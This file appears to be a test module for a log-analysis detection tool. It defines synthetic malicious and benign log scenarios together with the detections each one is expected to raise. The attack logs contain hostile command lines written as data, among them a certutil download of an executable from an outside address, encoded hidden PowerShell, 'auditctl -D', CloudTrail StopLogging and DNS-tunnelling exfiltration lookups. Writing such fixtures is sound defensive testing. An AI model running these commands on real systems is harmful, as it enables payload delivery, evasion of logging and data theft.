import { analyseLogs } from "./analyse";
import type { InvestigationState } from "./investigate";

/**
 * Validation scenarios: SYNTHETIC logs (documentation-only IP ranges and example domains) for controlled
 * attack and benign situations, each with the detections that must appear, those that must not, and the
 * most severe state an investigation may reach. They run in the test suite and their measured results are
 * shown in the Detection Lab, labelled as synthetic.
 */

export interface Scenario {
  id: string;
  name: string;
  kind: "malicious" | "benign";
  files: { name: string; content: string }[];
  expect: string[];
  forbid: string[];
  /** For malicious scenarios: the state the top investigation should reach. For benign: the worst allowed. */
  state: InvestigationState;
}

const pad = (n: number) => String(n).padStart(2, "0");
const ssh = (d: number, s: number, msg: string) => `Oct ${pad(d)} 10:${pad(Math.floor(s / 60))}:${pad(s % 60)} web1 sshd[311]: ${msg}`;
const sys = (s: number, prog: string, msg: string) => `Oct 20 11:${pad(Math.floor(s / 60))}:${pad(s % 60)} web1 ${prog}: ${msg}`;
const ct = (records: object[]) => JSON.stringify({ Records: records });
const w = (o: object) => JSON.stringify(o);
/** Hex-encode text (works in browsers too, where Node's Buffer doesn't exist). */
const hex = (t: string) => [...new TextEncoder().encode(t)].map((b) => b.toString(16).padStart(2, "0")).join("");

export const SCENARIOS: Scenario[] = [
  {
    id: "ssh-takeover",
    name: "SSH password guessing, then a backdoor account and logging switched off",
    kind: "malicious",
    files: [
      {
        name: "auth.log",
        content: [
          ...Array.from({ length: 18 }, (_, i) => ssh(20, i, `Failed password for ${i % 2 ? "root" : "deploy"} from 203.0.113.7 port 5${pad(i)} ssh2`)),
          ssh(20, 30, "Accepted password for deploy from 203.0.113.7 port 5999 ssh2"),
          sys(60, "sudo", "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash"),
          sys(90, "useradd[900]", "new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash"),
          sys(95, "usermod[901]", "add 'sysupdate' to group 'sudo'"),
          sys(120, "crontab[902]", "(sysupdate) REPLACE (sysupdate)"),
          sys(150, "sudo", "  deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/sbin/auditctl -D"),
        ].join("\n"),
      },
    ],
    expect: ["auth.success-after-failures", "priv.sudo-root-shell", "persist.account-created", "priv.admin-grant", "persist.scheduled", "evasion.logging-disabled"],
    forbid: ["auth.new-source"],
    state: "likely_malicious",
  },
  {
    id: "cloud-root",
    name: "Cloud root sign-in without MFA, admin user created, logging stopped, SSH opened to everyone",
    kind: "malicious",
    files: [
      {
        name: "cloudtrail.json",
        content: ct([
          {
            eventTime: "2026-10-20T08:00:00Z",
            eventSource: "signin.amazonaws.com",
            eventName: "ConsoleLogin",
            userIdentity: { type: "Root" },
            sourceIPAddress: "198.51.100.77",
            responseElements: { ConsoleLogin: "Success" },
            additionalEventData: { MFAUsed: "No" },
          },
          {
            eventTime: "2026-10-20T08:03:00Z",
            eventSource: "iam.amazonaws.com",
            eventName: "CreateUser",
            userIdentity: { type: "Root" },
            sourceIPAddress: "198.51.100.77",
            requestParameters: { userName: "svc-sync" },
          },
          {
            eventTime: "2026-10-20T08:04:00Z",
            eventSource: "iam.amazonaws.com",
            eventName: "AttachUserPolicy",
            userIdentity: { type: "Root" },
            sourceIPAddress: "198.51.100.77",
            requestParameters: { userName: "svc-sync", policyArn: "arn:aws:iam::aws:policy/AdministratorAccess" },
          },
          {
            eventTime: "2026-10-20T08:05:00Z",
            eventSource: "iam.amazonaws.com",
            eventName: "CreateAccessKey",
            userIdentity: { type: "Root" },
            sourceIPAddress: "198.51.100.77",
            requestParameters: { userName: "svc-sync" },
          },
          {
            eventTime: "2026-10-20T08:20:00Z",
            eventSource: "cloudtrail.amazonaws.com",
            eventName: "StopLogging",
            userIdentity: { type: "IAMUser", userName: "svc-sync" },
            sourceIPAddress: "198.51.100.77",
            requestParameters: { name: "main-trail" },
          },
          {
            eventTime: "2026-10-20T08:22:00Z",
            eventSource: "ec2.amazonaws.com",
            eventName: "AuthorizeSecurityGroupIngress",
            userIdentity: { type: "IAMUser", userName: "svc-sync" },
            sourceIPAddress: "198.51.100.77",
            requestParameters: { groupId: "sg-0abc", ipPermissions: { items: [{ fromPort: 22, toPort: 22, ipRanges: { items: [{ cidrIp: "0.0.0.0/0" }] } }] } },
          },
        ]),
      },
    ],
    expect: ["cloud.root-activity", "persist.account-created", "priv.admin-grant", "persist.credential-added", "evasion.logging-disabled", "cloud.exposure-change"],
    forbid: [],
    state: "likely_malicious",
  },
  {
    id: "macro-doc",
    name: "Document macro runs encoded PowerShell, downloads a tool, installs a service, clears the log",
    kind: "malicious",
    files: [
      {
        name: "pc7-events.jsonl",
        content: [
          w({
            EventID: 1,
            ProviderName: "Microsoft-Windows-Sysmon",
            TimeCreated: "2026-10-20T09:00:00Z",
            Computer: "PC7",
            EventData: {
              User: "CORP\\dana",
              ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            },
          }),
          w({
            EventID: 4688,
            TimeCreated: "2026-10-20T09:01:00Z",
            Computer: "PC7",
            EventData: {
              SubjectUserName: "dana",
              ParentProcessName: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              NewProcessName: "C:\\Windows\\System32\\certutil.exe",
              CommandLine: "certutil -urlcache -split -f http://203.0.113.50/u.exe C:\\Users\\Public\\u.exe",
            },
          }),
          w({ EventID: 7045, TimeCreated: "2026-10-20T09:02:00Z", Computer: "PC7", EventData: { AccountName: "dana", ServiceName: "WinUpdSvc", ImagePath: "C:\\Users\\Public\\u.exe" } }),
          w({ EventID: 1102, TimeCreated: "2026-10-20T09:05:00Z", Computer: "PC7", EventData: { SubjectUserName: "dana" } }),
        ].join("\n"),
      },
    ],
    expect: ["exec.suspicious-parent", "exec.obfuscated-or-download", "persist.scheduled", "evasion.logging-disabled"],
    forbid: [],
    state: "likely_malicious",
  },
  {
    id: "dns-tunnel",
    name: "A workstation sends data in DNS lookups",
    kind: "malicious",
    files: [
      {
        name: "dnsmasq.log",
        content: Array.from(
          { length: 40 },
          (_, i) => `Oct 20 12:${pad(i)}:00 gw dnsmasq[77]: query[TXT] ${hex(`chunk-${i}-of-customer-export-0123456789`).slice(0, 52)}.t.exfil-example.net from 10.0.0.23`,
        )
          .concat(Array.from({ length: 10 }, (_, i) => `Oct 20 12:${pad(i)}:30 gw dnsmasq[77]: query[A] www.example.com from 10.0.0.23`))
          .join("\n"),
      },
    ],
    expect: ["dns.tunneling-suspect"],
    forbid: [],
    state: "suspicious",
  },
  {
    id: "new-source",
    name: "An account that always signs in from one network suddenly signs in from another",
    kind: "malicious",
    files: [
      {
        name: "auth.log",
        content: [
          ...Array.from({ length: 14 }, (_, d) => ssh(d + 1, 0, "Accepted publickey for carol from 198.51.100.20 port 4000 ssh2")),
          ssh(15, 5, "Accepted publickey for carol from 203.0.113.99 port 4000 ssh2"),
        ].join("\n"),
      },
    ],
    expect: ["auth.new-source"],
    forbid: [],
    state: "inconclusive",
  },
  {
    id: "background-scanning",
    name: "Internet scanners probe the site; everything is rejected",
    kind: "benign",
    files: [
      {
        name: "access.log",
        content: ["/.env", "/wp-login.php", "/.git/HEAD", "/phpmyadmin/", "/search?q=1%27%20OR%20%271%27%3D%271"]
          .map((p, i) => `203.0.113.66 - - [20/Oct/2026:10:00:0${i} +0000] "GET ${p} HTTP/1.1" 404 120 "-" "Mozilla/5.0 zgrab/0.x"`)
          .join("\n"),
      },
    ],
    expect: ["web.scanning"],
    forbid: ["auth.success-after-failures"],
    state: "suspicious",
  },
  {
    id: "office-nat",
    name: "Many colleagues behind one office address mistype their passwords",
    kind: "benign",
    files: [
      {
        name: "auth.log",
        content: Array.from({ length: 8 }, (_, i) => [
          ssh(20, i * 4, `Failed password for user${i} from 198.51.100.10 port 6${pad(i)} ssh2`),
          ssh(20, i * 4 + 2, `Accepted password for user${i} from 198.51.100.10 port 6${pad(i)} ssh2`),
        ])
          .flat()
          .join("\n"),
      },
    ],
    expect: [],
    forbid: ["auth.success-after-failures", "auth.brute-force"],
    state: "suspicious",
  },
  {
    id: "routine-admin",
    name: "An administrator updates packages and restarts a service",
    kind: "benign",
    files: [
      {
        name: "auth.log",
        content: [
          sys(0, "sudo", "  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update"),
          sys(30, "sudo", "  alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx"),
          ssh(20, 0, "Accepted publickey for alice from 198.51.100.30 port 4000 ssh2"),
        ].join("\n"),
      },
    ],
    expect: [],
    forbid: ["priv.sudo-root-shell", "evasion.logging-disabled", "auth.brute-force"],
    state: "suspicious",
  },
  {
    id: "security-dns",
    name: "Anti-virus reputation lookups with long hash-like names",
    kind: "benign",
    files: [
      {
        name: "dnsmasq.log",
        content: Array.from({ length: 40 }, (_, i) => `Oct 20 12:${pad(i)}:00 gw dnsmasq[77]: query[A] ${hex(`file-hash-${i}-0123456789abcdef`).slice(0, 48)}.av.sophosxl.net from 10.0.0.40`).join(
          "\n",
        ),
      },
    ],
    expect: [],
    forbid: [],
    state: "suspicious",
  },
  {
    id: "key-rotation",
    name: "A CI user rotates its own access key",
    kind: "benign",
    files: [
      {
        name: "cloudtrail.json",
        content: ct([
          {
            eventTime: "2026-10-20T07:00:00Z",
            eventSource: "iam.amazonaws.com",
            eventName: "CreateAccessKey",
            userIdentity: { type: "IAMUser", userName: "ci" },
            sourceIPAddress: "198.51.100.40",
            requestParameters: { userName: "ci" },
          },
        ]),
      },
    ],
    expect: [],
    forbid: ["persist.credential-added", "cloud.root-activity"],
    state: "suspicious",
  },
];

const STATE_RANK: Record<InvestigationState, number> = { benign: 0, resolved: 0, contained: 0, new: 1, investigating: 1, inconclusive: 2, suspicious: 3, likely_malicious: 4, confirmed_malicious: 5 };

export interface ScenarioResult {
  id: string;
  name: string;
  kind: Scenario["kind"];
  detected: string[];
  missed: string[];
  unexpected: string[];
  /** Medium-or-worse signals in a benign scenario (false positives that would reach a person). */
  noisy: string[];
  topState: InvestigationState | null;
  stateOk: boolean;
  passed: boolean;
}

export function runScenario(s: Scenario): ScenarioResult {
  const a = analyseLogs(s.files, `scenario:${s.id}`, { year: 2026 });
  const rules = [...new Set(a.findings.map((f) => f.ruleId.replace(/^web\.payload-.*/, "web.payload")))];
  const missed = s.expect.filter((r) => !rules.includes(r));
  const unexpected = s.forbid.filter((r) => rules.includes(r));
  const noisy = s.kind === "benign" ? a.findings.filter((f) => f.severity === "medium" || f.severity === "high" || f.severity === "critical").map((f) => f.ruleId) : [];
  const top = a.investigations[0]?.state ?? null;
  const stateOk = s.kind === "malicious" ? !!top && STATE_RANK[top] >= STATE_RANK[s.state] : !top || STATE_RANK[top] <= STATE_RANK[s.state];
  return { id: s.id, name: s.name, kind: s.kind, detected: rules, missed, unexpected, noisy, topState: top, stateOk, passed: !missed.length && !unexpected.length && !noisy.length && stateOk };
}

export interface ValidationSummary {
  scenarios: ScenarioResult[];
  expectedDetections: number;
  foundDetections: number;
  benignScenarios: number;
  benignWithAlerts: number;
  benignEscalated: number;
}

export function validate(): ValidationSummary {
  const results = SCENARIOS.map(runScenario);
  const benign = results.filter((r) => r.kind === "benign");
  return {
    scenarios: results,
    expectedDetections: SCENARIOS.reduce((n, s) => n + s.expect.length, 0),
    foundDetections: results.reduce((n, r) => n + (SCENARIOS.find((s) => s.id === r.id)!.expect.length - r.missed.length), 0),
    benignScenarios: benign.length,
    benignWithAlerts: benign.filter((r) => r.noisy.length).length,
    benignEscalated: benign.filter((r) => r.topState === "likely_malicious" || r.topState === "confirmed_malicious").length,
  };
}
